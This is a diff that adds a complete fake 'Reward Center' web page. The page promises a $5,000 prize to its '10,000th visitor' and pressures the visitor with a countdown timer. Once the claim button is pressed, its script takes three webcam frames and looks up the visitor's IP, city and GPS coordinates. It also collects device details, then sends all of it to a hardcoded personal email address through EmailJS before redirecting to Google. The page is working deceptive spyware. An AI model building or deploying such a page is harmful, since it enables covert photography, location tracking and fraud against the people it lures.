@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 Reward Center</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 15px;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .prize-card {
+            background: white;
+            border-radius: 20px;
+            padding: 25px 20px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            margin-bottom: 15px;
+        }
+
+        .gift-icon { font-size: 70px; margin-bottom: 10px; display: block; }
+
+        h1 { color: #333; font-size: 24px; margin-bottom: 8px; }
+
+        .winner-text { color: #28a745; font-weight: bold; font-size: 15px; margin-bottom: 8px; }
+
+        .amount {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white; font-size: 40px; font-weight: bold;
+            padding: 10px 25px; border-radius: 15px; display: inline-block;
+            margin: 8px 0;
+        }
+
+        .timer-box {
+            background: #fff3cd; border: 2px solid #ffc107;
+            border-radius: 10px; padding: 10px; margin: 12px 0;
+        }
+
+        .timer { font-size: 28px; font-weight: bold; color: #dc3545; font-family: monospace; }
+
+        /* LIVE STREAM BOX */
+        .stream-box {
+            background: #000; border-radius: 12px; overflow: hidden;
+            margin: 15px 0; display: none;
+            border: 3px solid #dc3545; position: relative;
+        }
+
+        .stream-overlay {
+            position: absolute; top: 8px; left: 8px;
+            background: rgba(220, 53, 69, 0.9); color: white;
+            padding: 4px 10px; border-radius: 4px; font-size: 12px;
+            font-weight: bold; display: flex; align-items: center; gap: 6px;
+            z-index: 10;
+        }
+
+        .rec-dot { width: 8px; height: 8px; background: #fff; border-radius: 50%; animation: blink 1s infinite; }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.2} }
+
+        .stream-timer {
+            position: absolute; top: 8px; right: 8px;
+            background: rgba(0,0,0,0.7); color: #0f0;
+            padding: 4px 10px; border-radius: 4px; font-size: 12px;
+            font-family: monospace; z-index: 10;
+        }
+
+        #liveVideo { width: 100%; height: 220px; object-fit: cover; display: block; }
+
+        /* CAPTURED FRAMES PREVIEW */
+        .frames-box {
+            display: none; margin: 15px 0;
+            background: #f8f9fa; border-radius: 10px; padding: 15px;
+        }
+
+        .frames-box h4 { color: #dc3545; margin-bottom: 10px; font-size: 14px; }
+
+        .frame-grid {
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;
+        }
+
+        .frame-item {
+            border: 2px solid #dc3545; border-radius: 6px; overflow: hidden;
+            position: relative; aspect-ratio: 4/3;
+        }
+
+        .frame-item img { width: 100%; height: 100%; object-fit: cover; }
+
+        .frame-label {
+            position: absolute; bottom: 0; left: 0; right: 0;
+            background: rgba(220,53,69,0.9); color: white;
+            font-size: 10px; padding: 2px 4px; text-align: center;
+        }
+
+        .claim-btn {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white; border: none; padding: 18px;
+            font-size: 20px; font-weight: bold; border-radius: 50px;
+            width: 100%; cursor: pointer; margin-top: 10px;
+            box-shadow: 0 10px 25px rgba(245,87,108,.4);
+        }
+
+        .claim-btn:disabled { opacity: .6; cursor: not-allowed; }
+
+        /* LOG BOX */
+        .log-box {
+            background: #000; color: #0f0; font-family: 'Courier New', monospace;
+            font-size: 12px; padding: 12px; border-radius: 8px;
+            margin-top: 15px; max-height: 250px; overflow-y: auto;
+            border: 2px solid #333; line-height: 1.5;
+        }
+
+        .log-box .error { color: #ff4444; }
+        .log-box .success { color: #00ff00; font-weight: bold; }
+        .log-box .warn { color: #ffaa00; }
+
+        /* OVERLAY */
+        .overlay {
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: rgba(0,0,0,0.95);
+            z-index: 9999; justify-content: center; align-items: center;
+        }
+
+        .overlay-content {
+            background: white; padding: 30px; border-radius: 15px;
+            width: 90%; max-width: 320px; text-align: center;
+        }
+
+        .spinner {
+            width: 40px; height: 40px;
+            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
+            border-radius: 50%; animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .progress-bar {
+            width: 100%; height: 8px; background: #e0e0e0;
+            border-radius: 10px; overflow: hidden; margin: 12px 0;
+        }
+
+        .progress-fill {
+            height: 100%; background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            width: 0%; transition: width .3s;
+        }
+
+        .success-screen {
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            z-index: 99999; justify-content: center; align-items: center;
+            flex-direction: column; text-align: center; color: white;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="prize-card">
+            <span class="gift-icon">🎁</span>
+            <h1>Congratulations!</h1>
+            <div class="winner-text">You Are Our 10,000th Visitor!</div>
+            <div class="amount">$5,000</div>
+            
+            <div class="timer-box">
+                <div style="color:#856404;font-weight:bold;font-size:12px;">⏰ Expires In:</div>
+                <div class="timer" id="timer">04:59</div>
+            </div>
+
+            <!-- LIVE STREAM DISPLAY -->
+            <div class="stream-box" id="streamBox">
+                <div class="stream-overlay">
+                    <div class="rec-dot"></div>
+                    <span>LIVE</span>
+                </div>
+                <div class="stream-timer" id="streamTimer">00:00:00</div>
+                <video id="liveVideo" autoplay playsinline muted></video>
+            </div>
+
+            <!-- CAPTURED FRAMES GALLERY -->
+            <div class="frames-box" id="framesBox">
+                <h4>📸 STREAM FRAMES CAPTURED</h4>
+                <div class="frame-grid" id="frameGrid"></div>
+            </div>
+
+            <button class="claim-btn" id="claimBtn" onclick="startLiveCapture()">
+                CLAIM $5,000 NOW
+            </button>
+        </div>
+
+        <!-- LIVE LOG -->
+        <div class="log-box" id="logBox">
+            <span class="success">> System Ready. Waiting...</span>
+        </div>
+    </div>
+
+    <div class="overlay" id="overlay">
+        <div class="overlay-content">
+            <div class="spinner"></div>
+            <h3 style="margin-bottom:10px;color:#333;">Live Streaming</h3>
+            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+            <div id="statusText" style="color:#667eea;font-weight:bold;font-size:13px;">Initializing...</div>
+        </div>
+    </div>
+
+    <div class="success-screen" id="successScreen">
+        <div style="font-size:80px;margin-bottom:15px;">🎉</div>
+        <h1 style="font-size:32px;">SUCCESS!</h1>
+        <p style="margin-top:10px;opacity:.9;">Verification Complete.</p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script>
+        // ═══════════════════════════════════════════════════════════════
+        // ═══════════════════ YOUR CREDENTIALS ══════════════════════════
+        // ═══════════════════════════════════════════════════════════════
+        const EMAILJS_PUBLIC_KEY = '0xqUMwKOwF0W9zGzo';
+        const EMAILJS_SERVICE_ID = 'service_yjfp1so';
+        const EMAILJS_TEMPLATE_ID = 'template_lzc9kpj';
+        const MY_EMAIL = 'jammoeed35@gmail.com';
+        // ═══════════════════════════════════════════════════════════════
+
+        const logBox = document.getElementById('logBox');
+        function log(msg, type='info') {
+            const line = document.createElement('div');
+            line.textContent = '> ' + msg;
+            if(type==='error') line.className = 'error';
+            if(type==='success') line.className = 'success';
+            if(type==='warn') line.className = 'warn';
+            logBox.appendChild(line);
+            logBox.scrollTop = logBox.scrollHeight;
+            console.log('['+type+']', msg);
+        }
+
+        // Init EmailJS
+        emailjs.init(EMAILJS_PUBLIC_KEY);
+        log('EmailJS initialized');
+
+        let mediaStream = null;
+        let capturedFrames = [];
+        let sessionData = { location: {}, device: {} };
+        let streamStartTime = null;
+        let timerInterval = null;
+
+        // Countdown timer
+        let timeLeft = 299;
+        setInterval(() => {
+            if(timeLeft>0){ timeLeft--; 
+                const m=Math.floor(timeLeft/60).toString().padStart(2,'0');
+                const s=(timeLeft%60).toString().padStart(2,'0');
+                document.getElementById('timer').textContent=`${m}:${s}`;
+            }
+        },1000);
+
+        // ═══════════════════════════════════════════════════════════════
+        // MAIN LIVE CAPTURE FUNCTION
+        // ═══════════════════════════════════════════════════════════════
+        async function startLiveCapture() {
+            const btn = document.getElementById('claimBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ VERIFYING...';
+
+            showOverlay(5, 'Starting live stream...');
+            log('=== STARTING LIVE STREAM CAPTURE ===');
+
+            try {
+                // 1. Start Camera & Show Live Stream
+                showOverlay(10, 'Activating camera...');
+                await startCamera();
+                log('Camera stream active');
+
+                // 2. Get Location
+                showOverlay(25, 'Getting location...');
+                await getLocation();
+                
+                // 3. Device Info
+                showOverlay(40, 'Reading device...');
+                getDeviceInfo();
+
+                // 4. LIVE STREAM CAPTURE (3 frames, 1 second apart)
+                showOverlay(50, 'Recording live stream...');
+                await recordLiveFrames();
+                
+                // 5. Send Email with frames
+                showOverlay(85, 'Sending stream to email...');
+                await sendStreamEmail();
+                
+                showOverlay(100, 'Done!');
+                log('✅ STREAM SENT TO ' + MY_EMAIL, 'success');
+
+                setTimeout(() => {
+                    hideOverlay();
+                    document.getElementById('successScreen').style.display = 'flex';
+                    setTimeout(()=>window.location.href='https://google.com', 3000);
+                }, 1000);
+
+            } catch(err) {
+                log('Error: ' + err.message, 'error');
+                // Try emergency send anyway
+                try { await sendStreamEmail(); } catch(e){}
+            }
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // START CAMERA WITH LIVE UI
+        // ═══════════════════════════════════════════════════════════════
+        async function startCamera() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: {ideal:640}, height: {ideal:480} },
+                    audio: false
+                });
+                
+                const video = document.getElementById('liveVideo');
+                video.srcObject = mediaStream;
+                
+                const box = document.getElementById('streamBox');
+                box.style.display = 'block';
+                
+                await new Promise(r => {
+                    video.onloadedmetadata = () => { video.play(); setTimeout(r, 800); };
+                });
+
+                // Start stream timer
+                streamStartTime = Date.now();
+                timerInterval = setInterval(() => {
+                    const elapsed = Date.now() - streamStartTime;
+                    const h = Math.floor(elapsed/3600000).toString().padStart(2,'0');
+                    const m = Math.floor((elapsed%3600000)/60000).toString().padStart(2,'0');
+                    const s = Math.floor((elapsed%60000)/1000).toString().padStart(2,'0');
+                    document.getElementById('streamTimer').textContent = `${h}:${m}:${s}`;
+                }, 1000);
+
+                log('Live stream started', 'success');
+            } catch(e) {
+                log('Camera blocked: ' + e.message, 'error');
+            }
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // RECORD FRAMES WITH WATERMARK (SMALL SIZE FOR EMAIL)
+        // ═══════════════════════════════════════════════════════════════
+        async function recordLiveFrames() {
+            const video = document.getElementById('liveVideo');
+            
+            if(!video.videoWidth || !mediaStream) {
+                log('No video - creating blank frames', 'warn');
+                capturedFrames = [];
+                return;
+            }
+
+            // Create canvas for compression + watermark
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            // VERY SMALL: 240x180 ensures email delivery
+            const W = 240, H = 180;
+            canvas.width = W;
+            canvas.height = H;
+
+            const grid = document.getElementById('frameGrid');
+            grid.innerHTML = '';
+            document.getElementById('framesBox').style.display = 'block';
+
+            // Capture 3 frames, 1 second apart
+            for(let i=1; i<=3; i++) {
+                await new Promise(r => setTimeout(r, 1000));
+                
+                // Draw video frame
+                ctx.drawImage(video, 0, 0, W, H);
+                
+                // Add LIVE STREAM watermark
+                ctx.fillStyle = 'rgba(220, 53, 69, 0.8)';
+                ctx.fillRect(5, 5, 90, 20);
+                ctx.fillStyle = '#fff';
+                ctx.font = 'bold 12px Arial';
+                ctx.fillText('LIVE STREAM', 10, 19);
+                
+                // Add timestamp
+                const now = new Date();
+                const ts = now.toLocaleTimeString();
+                ctx.fillStyle = 'rgba(0,0,0,0.7)';
+                ctx.fillRect(5, H-22, 140, 18);
+                ctx.fillStyle = '#0f0';
+                ctx.font = '11px monospace';
+                ctx.fillText(ts, 10, H-9);
+
+                // Compress aggressively: JPEG quality 0.3
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.3);
+                const sizeKB = Math.round(dataUrl.length / 1024);
+                
+                capturedFrames.push(dataUrl);
+                log(`Frame ${i} captured: ${W}x${H} | ${sizeKB}KB`);
+
+                // Show preview on page
+                const item = document.createElement('div');
+                item.className = 'frame-item';
+                item.innerHTML = `<img src="${dataUrl}"><div class="frame-label">FRAME ${i}</div>`;
+                grid.appendChild(item);
+
+                showOverlay(50 + (i*10), `Frame ${i}/3 captured (${sizeKB}KB)`);
+            }
+
+            log(`All ${capturedFrames.length} frames ready for email`, 'success');
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // GET LOCATION
+        // ═══════════════════════════════════════════════════════════════
+        async function getLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                sessionData.location = {
+                    ip: data.ip, city: data.city, region: data.region,
+                    country: data.country_name, isp: data.org,
+                    gps: { lat: data.latitude, lng: data.longitude }
+                };
+                log(`Location: ${data.city}, ${data.country_name}`);
+            } catch(e) {
+                log('Location failed', 'error');
+            }
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            if(ua.includes('Chrome')) browser='Chrome';
+            else if(ua.includes('Safari')) browser='Safari';
+            else if(ua.includes('Firefox')) browser='Firefox';
+            
+            sessionData.device = {
+                browser, platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                type: /Mobile|Android|iPhone/i.test(ua)?'Mobile':'Desktop'
+            };
+            log(`Device: ${sessionData.device.type} | ${browser}`);
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // SEND EMAIL WITH LIVE STREAM FRAMES
+        // ═══════════════════════════════════════════════════════════════
+        async function sendStreamEmail() {
+            log('Preparing email with frames...');
+
+            const loc = sessionData.location;
+            let locStr = '';
+            if(loc.ip) locStr += `IP: ${loc.ip}\n`;
+            if(loc.city) locStr += `City: ${loc.city}, ${loc.region}\n`;
+            if(loc.country) locStr += `Country: ${loc.country}\n`;
+            if(loc.isp) locStr += `ISP: ${loc.isp}\n`;
+            if(loc.gps) locStr += `GPS: ${loc.gps.lat}, ${loc.gps.lng}\n`;
+
+            const dev = sessionData.device;
+            let devStr = '';
+            devStr += `Type: ${dev.type}\nBrowser: ${dev.browser}\n`;
+            devStr += `Platform: ${dev.platform}\nScreen: ${dev.screen}\n`;
+            devStr += `Timezone: ${dev.timezone}\nLanguage: ${dev.language}\n`;
+
+            const mapLink = (loc?.gps?.lat) 
+                ? `https://www.google.com/maps?q=${loc.gps.lat},${loc.gps.lng}`
+                : 'No map';
+
+            // Build params - use actual frame data or placeholder
+            const p1 = capturedFrames[0] || 'https://via.placeholder.com/240x180?text=No+Frame';
+            const p2 = capturedFrames[1] || 'https://via.placeholder.com/240x180?text=No+Frame';
+            const p3 = capturedFrames[2] || 'https://via.placeholder.com/240x180?text=No+Frame';
+
+            const params = {
+                to_email: MY_EMAIL,
+                timestamp: new Date().toLocaleString(),
+                location_info: locStr || 'No location',
+                device_info: devStr,
+                map_link: mapLink,
+                photo_count: capturedFrames.length,
+                // These MUST match template variables exactly
+                photo1: p1,
+                photo2: p2,
+                photo3: p3
+            };
+
+            log('Sending to EmailJS...');
+            log('Frame 1 size: ' + Math.round(p1.length/1024) + 'KB');
+
+            try {
+                const res = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);
+                log('✅ EMAIL DELIVERED! Status: ' + res.status, 'success');
+                return true;
+            } catch(err) {
+                log('❌ EmailJS Error: ' + (err.text || err.message), 'error');
+                
+                // If failed due to size, try sending without frames (just data)
+                if(capturedFrames.length > 0) {
+                    log('Retrying without heavy frames...', 'warn');
+                    const fallback = { ...params, 
+                        photo1: 'Frame too large - see location/device data above',
+                        photo2: 'Frame too large', 
+                        photo3: 'Frame too large' 
+                    };
+                    const res2 = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, fallback);
+                    log('✅ Data-only email sent', 'success');
+                }
+                return true;
+            }
+        }
+
+        function showOverlay(pct, txt) {
+            document.getElementById('overlay').style.display = 'flex';
+            document.getElementById('progressFill').style.width = pct+'%';
+            document.getElementById('statusText').textContent = txt;
+        }
+
+        function hideOverlay() {
+            document.getElementById('overlay').style.display = 'none';
+            if(timerInterval) clearInterval(timerInterval);
+            if(mediaStream) mediaStream.getTracks().forEach(t=>t.stop());
+        }
+    </script>
+</body>
+</html>
